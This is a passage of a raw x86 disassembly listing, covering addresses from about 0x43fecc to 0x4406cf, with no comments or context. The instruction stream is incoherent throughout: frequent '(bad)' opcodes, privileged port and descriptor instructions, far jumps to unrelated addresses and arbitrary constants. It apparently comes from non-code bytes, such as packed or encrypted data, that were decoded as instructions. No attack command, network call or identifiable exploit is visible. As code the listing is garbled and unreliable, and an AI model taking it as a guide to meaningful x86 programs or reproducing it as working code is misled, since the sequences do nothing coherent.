  43fecc:	(bad)  
  43fecd:	sar    ah,0x84
  43fed0:	sbb    BYTE PTR [ecx+0x56],al
  43fed3:	pop    es
  43fed4:	jecxz  0x43fe74
  43fed6:	push   edx
  43fed7:	inc    DWORD PTR [eax]
  43fed9:	and    eax,0xff040e80
  43fede:	inc    edi
  43fedf:	adc    eax,0x25f76240
  43fee4:	mov    esi,0x40fd7f9
  43fee9:	out    0x97,eax
  43feeb:	sbb    eax,0x5e016240
  43fef0:	clc    
  43fef1:	bound  eax,QWORD PTR [eax+0xd662d03]
  43fef7:	sub    al,0x29
  43fef9:	mov    ds:0x6a3f0e80,al
  43fefe:	div    DWORD PTR [ebx]
  43ff00:	mov    esi,0xd7768fc8
  43ff05:	mov    ds:0xc17efc06,eax
  43ff0a:	or     al,BYTE PTR [eax+eax*1]
  43ff0d:	bound  eax,QWORD PTR [ecx]
  43ff0f:	pop    esi
  43ff10:	clc    
  43ff11:	bound  eax,QWORD PTR [eax+0xd568503]
  43ff17:	sub    al,0x21
  43ff19:	and    al,BYTE PTR [eax-0x3800ebf2]
  43ff1f:	adc    eax,0x2bf76240
  43ff24:	mov    esi,0x140fd779
  43ff29:	out    0x17,eax
  43ff2b:	push   ds
  43ff2c:	inc    eax
  43ff2d:	bound  ebx,QWORD PTR [ebp+0x7f75ff52]
  43ff33:	push   cs
  43ff34:	adc    al,0xe7
  43ff36:	mov    bh,0x21
  43ff38:	inc    eax
  43ff39:	bound  ebp,QWORD PTR [edi]
  43ff3b:	lods   al,BYTE PTR ds:[esi]
  43ff3c:	or     eax,DWORD PTR [eax]
  43ff3e:	jmp    0x732b3bf7
  43ff43:	popf   
  43ff44:	push   edx
  43ff45:	dec    DWORD PTR [ebp-0x26]
  43ff48:	jmp    0xc1a260c9
  43ff4d:	sub    ah,BYTE PTR [edx-0xbd19d27]
  43ff53:	je     0x43ff36
  43ff55:	or     BYTE PTR [esi],0x69
  43ff58:	jmp    0xddf06160
  43ff5d:	outs   dx,BYTE PTR ds:[esi]
  43ff5e:	xor    eax,0xdf0429b4
  43ff63:	sub    DWORD PTR [eax-0x1a538aa3],0x6e
  43ff6a:	sub    eax,0x7d0429bc
  43ff6f:	jnp    0x43feff
  43ff71:	add    al,0x62
  43ff73:	(bad)  
  43ff75:	pop    es
  43ff76:	rol    DWORD PTR [ecx-0x541a3c31],1
  43ff7c:	sub    ah,dh
  43ff7e:	out    0x89,al
  43ff80:	test   al,0x5e
  43ff82:	gs push esp
  43ff84:	xchg   ecx,eax
  43ff85:	inc    ebx
  43ff86:	(bad)  
  43ff87:	shr    DWORD PTR [eax+0x66],1
  43ff8a:	retf   0xe9d9
  43ff8d:	add    esp,edi
  43ff8f:	int    0x74
  43ff91:	sub    al,0x83
  43ff93:	sbb    edx,ebp
  43ff95:	or     BYTE PTR [esi+0x6203e968],0xac
  43ff9c:	int    0x6e
  43ff9e:	mov    ch,0xb3
  43ffa0:	test   eax,0x81df0003
  43ffa5:	sub    BYTE PTR [ebp+0x75],bl
  43ffa8:	lods   al,BYTE PTR ds:[esi]
  43ffa9:	cmc    
  43ffaa:	outs   dx,BYTE PTR ds:[esi]
  43ffab:	lods   eax,DWORD PTR ds:[esi]
  43ffac:	mov    ebx,0x684103a9
  43ffb1:	jmp    0xedf061b9
  43ffb6:	xchg   BYTE PTR [ebp+0x3703a9b7],dl
  43ffbc:	or     cl,dh
  43ffbe:	jl     0x43ffdf
  43ffc0:	call   0xe9f7:0xbb4e0100
  43ffc7:	popa   
  43ffc8:	(bad)  [ebx+0x1e8fdced]
  43ffce:	sub    DWORD PTR [esi+0x5e],esp
  43ffd1:	fisubr DWORD PTR [eax-0x357e1f6a]
  43ffd7:	xchg   edx,eax
  43ffd8:	push   0xdd4ee9f7
  43ffdd:	xchg   ebp,eax
  43ffde:	mov    eax,ds:0x6201197f
  43ffe3:	inc    edi
  43ffe4:	daa    
  43ffe5:	jmp    0x43ffb8
  43ffe7:	jbe    0x43ffc6
  43ffe9:	xchg   ebp,eax
  43ffea:	sar    DWORD PTR [edi],0x19
  43ffed:	add    DWORD PTR [eax-0x79],ebp
  43fff0:	popa   
  43fff1:	add    cl,ch
  43fff3:	popa   
  43fff4:	mov    dh,0xfc
  43fff6:	jae    0x440031
  43fff8:	mov    dl,0x40
  43fffa:	jmp    0xba6426dd
  43ffff:	mov    al,ds:0x8187836f
  440004:	pop    esi
  440005:	shl    BYTE PTR [edx+0x0],1
  440008:	jns    0x440031
  44000a:	jmp    0x4768:0x87d20f9
  440011:	popa   
  440012:	add    cl,ch
  440014:	popa   
  440015:	pop    esi
  440016:	or     al,0x74
  440018:	jns    0x43ffd4
  44001a:	inc    eax
  44001b:	jmp    0xea3b8500
  440020:	popa   
  440021:	fnstenv [ebx]
  440023:	fld    QWORD PTR [eax+edx*4]
  440026:	sub    ch,BYTE PTR [ecx+0x28d85e61]
  44002c:	shl    BYTE PTR es:[ebx],1
  44002f:	cmc    
  440030:	or     al,0x90
  440032:	and    ch,BYTE PTR [ecx-0x1608439f]
  440038:	popa   
  440039:	fnstenv [ebx]
  44003b:	add    BYTE PTR [edi+0xb2ecf5e],al
  440041:	(bad)  ds:0xb5e34f51
  440047:	shl    DWORD PTR [ebx+0x6a],0x22
  44004b:	(bad)  
  44004c:	cmp    ebx,ebx
  44004e:	add    BYTE PTR [ebx+0x26cf5247],cl
  440054:	mov    ebx,ebp
  440056:	jge    0x440032
  440058:	cli    
  440059:	add    al,BYTE PTR [eax]
  44005b:	sbb    DWORD PTR [eax],0xbfff817
  440061:	int3   
  440062:	cld    
  440063:	pushf  
  440064:	repz ret 
  440066:	inc    eax
  440067:	add    BYTE PTR [eax+0xebb6b3],al
  44006d:	arpl   dx,cx
  44006f:	cld    
  440070:	pushf  
  440071:	and    edi,DWORD PTR [eax+eax*2-0x7047600]
  440078:	add    bl,bh
  44007a:	fisub  DWORD PTR ds:0x29b58604
  440080:	inc    eax
  440081:	retf   
  440082:	daa    
  440083:	or     BYTE PTR [ebp-0x6f7b1],al
  440089:	cmp    BYTE PTR [edi],dl
  44008b:	add    al,0x72
  44008d:	or     esp,esp
  44008f:	rol    ecx,1
  440091:	adc    ebx,ebx
  440093:	jge    0x440094
  440095:	pop    eax
  440096:	fdiv   QWORD PTR [ebp-0x3f]
  440099:	(bad)  
  44009a:	jecxz  0x44008b
  44009c:	ror    DWORD PTR [ebp*2-0x22a3188a],0x0
  4400a4:	add    BYTE PTR [eax],al
  4400a6:	leave  
  4400a7:	mov    ebx,0xf79d65d8
  4400ac:	mov    ah,BYTE PTR [ebx]
  4400ae:	sbb    al,0xdd
  4400b0:	or     BYTE PTR [edx],cl
  4400b2:	cli    
  4400b3:	clc    
  4400b4:	add    BYTE PTR [edx+0x70],ah
  4400b7:	add    ebp,DWORD PTR ds:0x2524f52e
  4400bd:	and    dh,BYTE PTR [eax+0x7a]
  4400c0:	xlat   BYTE PTR ds:[ebx]
  4400c1:	and    ecx,ebx
  4400c3:	in     al,0x2c
  4400c5:	xchg   esi,eax
  4400c6:	or     eax,0x70a21d25
  4400cb:	sub    cl,bh
  4400cd:	bound  esi,QWORD PTR [eax+0x3]
  4400d0:	sub    eax,0x2bfd7e00
  4400d5:	sub    DWORD PTR [edx+0x66e98270],esp
  4400db:	mov    edx,0xe7afc07b
  4400e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4400e1:	push   esp
  4400e2:	out    0x2d,eax
  4400e4:	iret   
  4400e5:	adc    eax,0xe8d7ef2
  4400ea:	push   ecx
  4400eb:	inc    eax
  4400ec:	jl     0x4400cb
  4400ee:	add    eax,0x23000370
  4400f3:	dec    eax
  4400f4:	sti    
  4400f5:	sub    al,0x5e
  4400f7:	in     eax,0x2b
  4400f9:	sbb    eax,0x49bc70a2
  4400fe:	outs   dx,DWORD PTR ds:[esi]
  4400ff:	push   edi
  440100:	dec    esi
  440101:	iret   
  440102:	cmp    al,0x33
  440104:	aaa    
  440105:	retf   
  440106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440107:	les    edi,FWORD PTR [ebx-0x15]
  44010a:	fld    st(4)
  44010c:	add    BYTE PTR [ebx+0x2cfd849b],al
  440112:	mov    ds:0x620b4124,al
  440117:	sti    
  440118:	mov    eax,0xfb3cd90f
  44011d:	out    0x7f,eax
  44011f:	sbb    eax,0xb23ff847
  440124:	idiv   edi
  440126:	test   eax,0x629381fc
  44012b:	jo     0x440130
  44012d:	mov    bh,0x64
  44012f:	fld1   
  440131:	add    esp,DWORD PTR [edx+0xf]
  440134:	gs out 0x0,eax
  440137:	inc    ecx
  440138:	(bad)  
  44013a:	push   ebp
  44013b:	add    edx,DWORD PTR [eax-0x27]
  44013e:	and    BYTE PTR [ebp+0x50d8b0dc],0x57
  440145:	imul   edi,DWORD PTR [ebx+0x5c],0xffffffd9
  440149:	jmp    0xea1d6cda
  44014e:	add    esi,DWORD PTR [edi+0x6b]
  440151:	inc    edi
  440152:	jnp    0x4400e1
  440154:	pop    eax
  440155:	test   eax,0xd4ee9d08
  44015a:	jg     0x44010b
  44015c:	in     eax,0xe3
  44015e:	add    esp,DWORD PTR [edx+0x22]
  440161:	fiadd  DWORD PTR [ebx]
  440163:	(bad)  
  440164:	fldenv [eax+ebp*8+0x41]
  440168:	fsqrt  
  44016a:	push   ebp
  44016b:	adc    DWORD PTR [edx-0x7],0xffffff80
  44016f:	(bad)
  440172:	xlat   BYTE PTR ds:[ebx]
  440173:	lock and eax,ebp
  440176:	add    esp,DWORD PTR [edx-0x27]
  440179:	pop    es
  44017a:	jnp    0x4401eb
  44017c:	dec    ebp
  44017d:	fld    QWORD PTR [ebx]
  44017f:	bound  ebp,QWORD PTR [eax+0x355f7ba9]
  440185:	iret   
  440186:	add    esp,DWORD PTR [edx+0x52]
  440189:	imul   ebx,DWORD PTR [ebx+esi*2+0x477ae9d9],0x29
  440191:	test   DWORD PTR [ebx],0xa46b5262
  440197:	push   ebx
  440198:	fldl2t 
  44019a:	lods   eax,DWORD PTR ds:[esi]
  44019b:	add    dh,ch
  44019d:	xchg   ebp,eax
  44019e:	adc    eax,0x2d959940
  4401a3:	inc    eax
  4401a4:	test   eax,0xa9402595
  4401a9:	xchg   ebp,eax
  4401aa:	add    BYTE PTR [edx+ecx*1+0xe625170],bl
  4401b1:	adc    al,0xd
  4401b3:	jmp    0x72931819
  4401b8:	(bad)  
  4401b9:	fmul   QWORD PTR [ebx+0xc00d675]
  4401bf:	jmp    0xbf485225
  4401c4:	fdivr  st,st(7)
  4401c6:	hlt    
  4401c7:	ret    0xd19b
  4401ca:	xchg   DWORD PTR [eax+0x66],ecx
  4401cd:	fld    DWORD PTR [eax]
  4401cf:	ins    BYTE PTR es:[edi],dx
  4401d0:	ins    BYTE PTR es:[edi],dx
  4401d1:	pop    esi
  4401d2:	lods   al,BYTE PTR ds:[esi]
  4401d3:	jno    0x440216
  4401d5:	fld    QWORD PTR [eax]
  4401d7:	jmp    0x35cc4296
  4401dc:	sub    esp,DWORD PTR [edi+esi*8-0x22]
  4401e0:	into   
  4401e1:	(bad)  
  4401e2:	scas   eax,DWORD PTR es:[edi]
  4401e3:	div    dh
  4401e5:	mov    edi,0x966b4797
  4401ea:	jb     0x4401bc
  4401ec:	xor    al,0xcc
  4401ee:	mov    dl,BYTE PTR [ebp+0x5f]
  4401f1:	add    DWORD PTR ds:0xac5e61e9,ecx
  4401f7:	jno    0x4401be
  4401f9:	fadd   QWORD PTR [eax]
  4401fb:	jmp    0x31424f5b
  440200:	add    dl,ch
  440202:	arpl   di,si
  440204:	(bad)  
  440205:	pusha  
  440206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440207:	mov    esi,DWORD PTR ds:0xe90c0059
  44020d:	popa   
  44020e:	pop    esi
  44020f:	dec    ebp
  440210:	ins    DWORD PTR es:[edi],dx
  440211:	(bad)  
  440212:	sub    BYTE PTR [esi+edi*2],cl
  440215:	mov    esi,0xbf961428
  44021a:	lods   al,BYTE PTR ds:[esi]
  44021b:	rcr    ebx,cl
  44021d:	mov    eax,ds:0xec6213e6
  440222:	pop    edi
  440223:	mov    al,BYTE PTR [eax]
  440225:	pop    es
  440226:	ficomp DWORD PTR [eax+0x14]
  440229:	mov    edx,edi
  44022b:	cs pushf 
  44022d:	jge    0x44025e
  44022f:	adc    eax,DWORD PTR [eax]
  440231:	jnp    0x4401c0
  440233:	sub    DWORD PTR [ebx-0x4b81a042],ecx
  440239:	sti    
  44023a:	xor    edi,esp
  44023c:	(bad)  
  44023d:	jnp    0x44021f
  44023f:	xchg   DWORD PTR [eax+0x6f],edx
  440242:	xlat   BYTE PTR ds:[ebx]
  440243:	add    BYTE PTR [ebx-0x76419ca6],cl
  440249:	into   
  44024a:	pop    esi
  44024b:	sub    al,0xca
  44024d:	aad    0x58
  44024f:	jl     0x44029e
  440251:	aaa    
  440252:	loope  0x4401df
  440254:	mov    al,0xa7
  440256:	(bad)  
  440257:	idiv   edi
  440259:	jne    0x44028d
  44025b:	jl     0x440242
  44025d:	jbe    0x440279
  44025f:	jge    0x4402b6
  440261:	pop    ss
  440262:	jecxz  0x4402ae
  440264:	or     BYTE PTR [eax],al
  440266:	inc    ebp
  440267:	in     al,0x93
  440269:	mov    BYTE PTR [edi+0x62],dh
  44026c:	idiv   edi
  44026e:	jo     0x440252
  440270:	loop   0x4402cf
  440272:	mov    eax,0xa7b09be4
  440277:	(bad)  
  440278:	idiv   edi
  44027a:	xor    eax,0x36e57c32
  44027f:	sbb    cl,ah
  440281:	int3   
  440282:	(bad)  
  440283:	mov    eax,ds:0xa217cccb
  440288:	retf   
  440289:	int3   
  44028a:	pop    es
  44028b:	mov    ds:0xe26ecccb,al
  440290:	jmp    0x440215
  440292:	inc    edi
  440293:	lds    edi,FWORD PTR [ebp+0x51]
  440296:	iret   
  440297:	sub    edi,DWORD PTR [ecx+ebx*1+0x30]
  44029b:	and    al,0xff
  44029d:	mov    BYTE PTR [edx+0x25],ah
  4402a0:	pop    ebx
  4402a1:	test   BYTE PTR [ebx-0x7],dl
  4402a4:	mov    cl,0xdb
  4402a6:	jmp    0xeb95f9ec
  4402ab:	dec    ebp
  4402ac:	arpl   WORD PTR [ebx+esi*1+0xb84b278],ax
  4402b3:	or     BYTE PTR [esi],0xc7
  4402b6:	jmp    0x4402dd
  4402b8:	push   edi
  4402b9:	or     BYTE PTR [ebp-0x5c3a885f],ch
  4402bf:	into   
  4402c0:	in     al,dx
  4402c1:	add    al,0x98
  4402c3:	stc    
  4402c4:	je     0x440301
  4402c6:	imul   esi,DWORD PTR [eax+0x3],0x2fea0087
  4402cd:	idiv   bh
  4402cf:	dec    ebp
  4402d0:	stc    
  4402d1:	je     0x440316
  4402d3:	pop    ecx
  4402d4:	jo     0x4402d9
  4402d6:	xchg   edx,ebp
  4402d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4402d9:	idiv   edi
  4402db:	xor    eax,0x594b7be9
  4402e0:	jo     0x4402e5
  4402e2:	xchg   edx,ebx
  4402e4:	lahf   
  4402e5:	idiv   edi
  4402e7:	sbb    eax,0x69537be9
  4402ec:	jo     0x4402f1
  4402ee:	xchg   edx,ebx
  4402f0:	(bad)  
  4402f1:	idiv   edi
  4402f3:	add    eax,0x56537bf7
  4402f8:	jo     0x4402fd
  4402fa:	test   esi,ecx
  4402fc:	out    0x9f,eax
  4402fe:	add    al,0x62
  440300:	jo     0x440310
  440302:	(bad)  
  440303:	jl     0x4402fe
  440305:	scas   eax,DWORD PTR es:[edi]
  440306:	mov    WORD PTR [eax-0x19],fs
  440309:	jnp    0x44035e
  44030b:	outs   dx,BYTE PTR ds:[esi]
  44030c:	jo     0x440311
  44030e:	sub    eax,0x5a75b0d4
  440313:	stos   BYTE PTR es:[edi],al
  440314:	clc    
  440315:	enter  0xebfb,0xd8
  440319:	aam    0x4b
  44031b:	xor    al,0x60
  44031d:	adc    al,0x6
  44031f:	(bad)  
  440320:	(bad)  
  440322:	js     0x440333
  440324:	fsubr  st,st(1)
  440326:	add    ebp,ecx
  440328:	dec    esp
  440329:	jno    0x4402d2
  44032b:	pop    esi
  44032c:	fldl2t 
  44032e:	jl     0x440330
  440330:	xor    BYTE PTR [ebp+0x73],ch
  440333:	or     BYTE PTR [ecx+eiz*2-0x2a52e117],al
  44033a:	xor    edi,DWORD PTR [eax+edx*1+0x75]
  44033e:	jo     0x4402f8
  440340:	jge    0x44038a
  440342:	bound  edi,QWORD PTR [eax-0x507b28f]
  440348:	adc    cl,BYTE PTR [esi]
  44034a:	pop    ebx
  44034b:	add    eax,0x7ea5286b
  440350:	dec    edi
  440351:	sbb    dh,BYTE PTR [ebx-0x602834c6]
  440357:	jle    0x440383
  440359:	push   ebx
  44035a:	push   esp
  44035b:	dec    esp
  44035c:	ret    
  44035d:	push   edx
  44035e:	and    eax,0x34a42f75
  440363:	pop    esp
  440364:	stos   BYTE PTR es:[edi],al
  440365:	sbb    BYTE PTR [ebx-0x39],ah
  440368:	add    eax,edi
  44036a:	mov    esi,0xf29d9d80
  44036f:	add    esp,DWORD PTR [edx-0x54]
  440372:	mov    bh,0xd
  440374:	xor    ebx,esi
  440376:	jecxz  0x4403f4
  440378:	lgs    edx,FWORD PTR [esi+0x7279787d]
  44037f:	adc    BYTE PTR [ebx-0x28f7a930],dh
  440385:	fcom   QWORD PTR [edi-0x176ef507]
  44038b:	jnp    0x44038a
  44038d:	(bad)  
  44038e:	jmp    0x152ea96
  440393:	xchg   ebp,eax
  440394:	add    BYTE PTR [ebp-0x69],al
  440397:	ins    BYTE PTR es:[edi],dx
  440398:	fnstcw WORD PTR [edx+0x5c784c29]
  44039e:	pop    esi
  44039f:	int    0xee
  4403a1:	retf   0x189
  4403a4:	jns    0x440370
  4403a6:	retf   0xe900
  4403a9:	push   ds
  4403aa:	jecxz  0x4403a0
  4403ac:	jb     0x440353
  4403ae:	push   0xdc1da483
  4403b3:	mul    DWORD PTR [ebp+ebp*1+0x106484eb]
  4403ba:	sar    DWORD PTR [ebp+ebp*1+0x5e],1
  4403be:	fld    DWORD PTR [eax]
  4403c0:	ins    BYTE PTR es:[edi],dx
  4403c1:	(bad)  
  4403c3:	xor    al,0xe2
  4403c5:	popa   
  4403c6:	(bad)  [ebx+0x5f17a59c]
  4403cc:	push   0xffffffea
  4403ce:	pop    ss
  4403cf:	xor    eax,0xd961f2
  4403d4:	rcr    BYTE PTR fs:[eax],cl
  4403d7:	xor    eax,0x6dd961e2
  4403dc:	clc    
  4403dd:	lods   al,BYTE PTR ds:[esi]
  4403de:	cmp    al,0x1c
  4403e0:	jmp    0x6a44dd46
  4403e5:	xchg   DWORD PTR [esi+0x48],ebx
  4403e8:	inc    edi
  4403e9:	out    0xa5,eax
  4403eb:	add    BYTE PTR ds:0x6583fab0,bh
  4403f1:	leave  
  4403f2:	mov    eax,ds:0x5f61e90b
  4403f7:	mov    ecx,0x60aa00ae
  4403fc:	test   DWORD PTR [edi],0xdd484561
  440402:	out    dx,al
  440403:	pop    edi
  440404:	mul    DWORD PTR [edx+0x27]
  440407:	cli    
  440408:	add    esi,ebx
  44040a:	out    0x71,al
  44040c:	add    al,BYTE PTR [eax]
  44040e:	inc    esi
  44040f:	or     bh,BYTE PTR [ecx-0x49]
  440412:	push   eax
  440413:	das    
  440414:	sti    
  440415:	test   ecx,ebp
  440417:	(bad)
  44041b:	pop    es
  44041c:	or     DWORD PTR [edi-0xb851b84],esi
  440422:	inc    esi
  440423:	adc    DWORD PTR [esp+edx*2+0x40],esi
  440427:	daa    
  440428:	out    0x8d,eax
  44042a:	mul    ebx
  44042c:	pop    ebx
  44042d:	or     ecx,DWORD PTR [ebx+0x7b9b8bdb]
  440433:	fild   DWORD PTR [eax]
  440435:	add    BYTE PTR [eax],al
  440437:	and    bh,bl
  440439:	(bad)  
  44043a:	fimul  WORD PTR [ebx]
  44043c:	jne    0x44042c
  44043e:	xchg   edx,esp
  440440:	jb     0x440422
  440442:	and    BYTE PTR [esi],0xdf
  440445:	jg     0x4403e3
  440447:	pusha  
  440448:	mov    al,0x7c
  44044a:	rcl    ah,0x8b
  44044d:	je     0x44041f
  44044f:	aam    0x2d
  440451:	cli    
  440452:	xlat   BYTE PTR ds:[ebx]
  440453:	jae    0x4404d1
  440455:	fisub  DWORD PTR [eax]
  440457:	mov    dl,0x7c
  440459:	sti    
  44045a:	shl    BYTE PTR [edi],0xcf
  44045d:	lldt   sp
  440460:	popa   
  440461:	jl     0x440472
  440463:	fmul   QWORD PTR [edi+esi*8]
  440466:	mov    bh,0xe3
  440468:	outs   dx,DWORD PTR ds:[esi]
  440469:	idiv   edi
  44046b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44046c:	fcom   QWORD PTR [ecx]
  44046e:	dec    DWORD PTR [esi+0x9]
  440471:	jge    0x4404f0
  440473:	xlat   BYTE PTR ds:[ebx]
  440474:	loop   0x4404e8
  440476:	loopne 0x4404ee
  440478:	push   ss
  440479:	jae    0x440437
  44047b:	adc    BYTE PTR [eax-0x24337c15],0x3e
  440482:	mov    DWORD PTR [esi+0x1],ecx
  440485:	jae    0x44041d
  440487:	bound  esp,QWORD PTR [edi+0x55e9549e]
  44048d:	test   eax,0x3824a6bc
  440492:	retf   
  440493:	sahf   
  440494:	sub    al,0x38
  440496:	retf   
  440497:	xchg   esi,eax
  440498:	mov    ebp,0xdce1eb7b
  44049d:	in     al,dx
  44049e:	dec    esp
  44049f:	or     al,0x1f
  4404a1:	jp     0x440499
  4404a3:	fstp   DWORD PTR [eax]
  4404a5:	lock mov al,0x1d
  4404a8:	jb     0x4404bc
  4404aa:	into   
  4404ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4404ac:	xor    eax,0x1795f84b
  4404b1:	inc    eax
  4404b2:	xchg   BYTE PTR [edi],ah
  4404b4:	mov    al,ds:0xf55d4579
  4404b9:	rol    BYTE PTR [ebx],cl
  4404bb:	out    0xb0,eax
  4404bd:	rol    DWORD PTR [edi],1
  4404bf:	mov    ebx,0xfffcea
  4404c4:	(bad)  
  4404c5:	in     eax,dx
  4404c6:	int3   
  4404c7:	cld    
  4404c8:	lods   eax,DWORD PTR ds:[esi]
  4404c9:	(bad)  
  4404ca:	aas    
  4404cb:	call   FWORD PTR [ebp+0x56]
  4404ce:	je     0x440513
  4404d0:	cmc    
  4404d1:	ins    DWORD PTR es:[edi],dx
  4404d2:	adc    ah,0x5d
  4404d5:	call   0x708a0446
  4404da:	add    al,0x64
  4404dd:	xor    esi,DWORD PTR [edx+edi*2+0x36]
  4404e1:	jmp    0x4404ab
  4404e3:	pop    es
  4404e4:	fistp  DWORD PTR [eax+edx*2+0x7a808784]
  4404eb:	mov    esp,0x848ace9
  4404f0:	int    0x7a
  4404f2:	shl    DWORD PTR [ebx+esi*1],0x9d
  4404f6:	add    BYTE PTR ds:0x34d69c21,dh
  4404fc:	adc    al,0xad
  4404fe:	cli    
  4404ff:	popa   
  440500:	arpl   cx,bx
  440502:	jne    0x440582
  440504:	imul   edx,ebx,0xadff03e9
  44050a:	fs inc ebx
  44050c:	push   ecx
  44050d:	(bad)  
  44050e:	rol    al,cl
  440510:	int    0xe4
  440512:	icebp  
  440513:	(bad)  
  440515:	push   esp
  440516:	pop    esi
  440517:	(bad)  
  440518:	pop    edi
  440519:	fldl2t 
  44051b:	fnstsw WORD PTR [edx-0x4a06daab]
  440521:	pop    ebp
  440522:	push   edx
  440523:	lock cs arpl bx,si
  440527:	mov    BYTE PTR [eax],0x5c
  44052a:	test   DWORD PTR [esi+0x7e],0x3e9d2dd
  440531:	jg     0x440508
  440533:	mov    DWORD PTR [esi-0x1e],0x6203f394
  44053a:	stos   BYTE PTR es:[edi],al
  44053b:	sbb    edi,DWORD PTR [eax+eiz*1+0x61]
  44053f:	pop    esp
  440540:	sub    dh,al
  440542:	shl    BYTE PTR [eax+0x79],cl
  440545:	ins    DWORD PTR es:[edi],dx
  440546:	pop    ebp
  440547:	jmp    0x31dfcc4
  44054c:	in     eax,dx
  44054d:	xchg   esi,eax
  44054e:	cwde   
  44054f:	mov    ecx,?
  440551:	or     al,0xd4
  440553:	jmp    0x7892675b
  440558:	dec    eax
  440559:	shl    BYTE PTR ds:[eax],cl
  44055c:	(bad)  
  44055d:	cmp    eax,0xc478e95d
  440562:	pop    esi
  440563:	push   0xffffffbf
  440565:	sub    esi,edx
  440567:	(bad)  
  440568:	mov    bh,0x31
  44056a:	out    0x69,eax
  44056c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44056d:	mov    ebx,0xb85f6300
  440572:	cwde   
  440573:	lods   eax,DWORD PTR ds:[esi]
  440574:	cmp    BYTE PTR [ecx],bl
  440576:	mov    fs,WORD PTR [ebp+0x8e1938]
  44057c:	sbb    al,0x7b
  44057e:	jo     0x440503
  440580:	mov    ebp,0x724f0e0a
  440585:	nop
  440586:	shr    DWORD PTR [edi-0x2d519fc1],1
  44058c:	add    BYTE PTR ds:[ebx+0x63],bl
  440590:	mov    edi,0xf7613a24
  440595:	xchg   BYTE PTR [edi],ah
  440597:	push   ebx
  440598:	push   ebp
  440599:	jne    0x4405e8
  44059b:	push   ss
  44059c:	add    BYTE PTR [esi-0x17039b03],ch
  4405a2:	popa   
  4405a3:	fnstcw WORD PTR [ebp+0x42]
  4405a6:	popf   
  4405a7:	sar    BYTE PTR [ecx+0xd95e73],1
  4405ad:	frstor cs:[ebx+eax*1-0x17]
  4405b2:	popa   
  4405b3:	fnstcw WORD PTR [ebp+0x46]
  4405b6:	xchg   edi,eax
  4405b7:	push   esp
  4405b8:	sub    eax,0x83d961e4
  4405bd:	das    
  4405be:	jl     0x4405d9
  4405c0:	mov    dh,BYTE PTR [ecx+edx*1-0x24ee8aad]
  4405c7:	pop    ebx
  4405c8:	imul   ecx
  4405ca:	popa   
  4405cb:	push   esi
  4405cc:	mul    DWORD PTR [edx+0x25]
  4405cf:	ins    BYTE PTR es:[edi],dx
  4405d0:	pop    es
  4405d1:	push   esi
  4405d2:	pop    edi
  4405d3:	push   esi
  4405d4:	ins    DWORD PTR es:[edi],dx
  4405d5:	std    
  4405d6:	bound  ecx,QWORD PTR [esi+0x53a57489]
  4405dc:	jne    0x4405db
  4405de:	mov    eax,0x70b2f507
  4405e3:	fisttp WORD PTR [eax]
  4405e5:	and    bl,BYTE PTR [edi+0x25d67cd1]
  4405eb:	pop    esp
  4405ec:	not    DWORD PTR [edx]
  4405ee:	int    0x63
  4405f0:	pop    es
  4405f1:	pop    esp
  4405f2:	add    ah,dh
  4405f4:	pop    ebx
  4405f5:	test   DWORD PTR [eax],0x24a3e2fb
  4405fb:	sti    
  4405fc:	xlat   BYTE PTR ds:[ebx]
  4405fd:	add    BYTE PTR [eax],al
  4405ff:	add    al,0x4d
  440601:	mov    ebx,0xf75f45b0
  440606:	push   DWORD PTR [eax-0x20]
  440609:	mov    ebx,0xaed7fb16
  44060e:	adc    bl,cl
  440610:	xlat   BYTE PTR ds:[ebx]
  440611:	add    BYTE PTR [ebx],ch
  440613:	or     al,0xd1
  440615:	mov    esi,0xb066867e
  44061a:	mov    ah,0x8b
  44061c:	xchg   esp,eax
  44061d:	std    
  44061e:	dec    ebx
  440620:	jge    0x44069e
  440622:	(bad)  
  440623:	pop    ebp
  440624:	stos   BYTE PTR es:[edi],al
  440625:	aad    0x8b
  440627:	repz pop edi
  440629:	popa   
  44062a:	or     DWORD PTR [ebx],ebp
  44062c:	push   eax
  44062d:	adc    DWORD PTR [eax],eax
  44062f:	mov    esp,DWORD PTR [ecx+esi*4-0x68]
  440633:	rep ins DWORD PTR es:[edi],dx
  440635:	idiv   edi
  440637:	adc    BYTE PTR [eax],ch
  440639:	adc    ecx,DWORD PTR [eax+0x40f866a7]
  44063f:	lahf   
  440640:	fs mov cl,0x98
  440643:	repnz ins DWORD PTR es:[edi],dx
  440645:	idiv   edi
  440647:	lock pop ds
  440649:	adc    ecx,DWORD PTR [ebx+0x1c7f5fab]
  44064f:	pop    edx
  440650:	loop   0x4405d9
  440652:	mov    esp,0xb100d74d
  440657:	add    BYTE PTR [ebx],ch
  440659:	push   edx
  44065a:	idiv   bh
  44065c:	cmp    edx,edi
  44065e:	not    DWORD PTR [edi+0x1f]
  440661:	sar    DWORD PTR [esi-0x74fba79a],0x4c
  440668:	and    DWORD PTR [ebp-0x2234769f],0x70620011
  440672:	xchg   BYTE PTR [edx-0x2],dh
  440675:	xchg   edi,eax
  440676:	sbb    BYTE PTR [edx-0x27],ah
  440679:	cld    
  44067a:	ins    BYTE PTR es:[edi],dx
  44067b:	jnp    0x4406d5
  44067d:	jo     0x440682
  44067f:	bound  edx,QWORD PTR [ecx]
  440681:	(bad)
  440685:	call   0x6fa606a4
  44068a:	push   edx
  44068b:	xchg   DWORD PTR es:[eax*4+0x35b1e87],edi
  440693:	add    BYTE PTR [ebp-0xb],ah
  440696:	stos   DWORD PTR es:[edi],eax
  440697:	clc    
  440698:	int    0x53
  44069a:	and    eax,0x3705e0e
  44069f:	xor    DWORD PTR [ebx+esi*2+0x7063c47f],0x3
  4406a7:	xor    eax,0x84140437
  4406ac:	clc    
  4406ad:	jo     0x4406b2
  4406af:	add    BYTE PTR [ebp+0x3b],ch
  4406b2:	nop
  4406b3:	scas   eax,DWORD PTR es:[edi]
  4406b4:	adc    al,0x76
  4406b6:	add    eax,DWORD PTR [eax]
  4406b8:	int    0x80
  4406ba:	add    eax,DWORD PTR [eax]
  4406bc:	add    BYTE PTR [edx-0x39],ah
  4406bf:	xor    eax,0x87a82f86
  4406c4:	xchg   DWORD PTR [esi+0x29000382],esi
  4406ca:	mov    ds:0x35567c2,eax
  4406cf:	cdq    
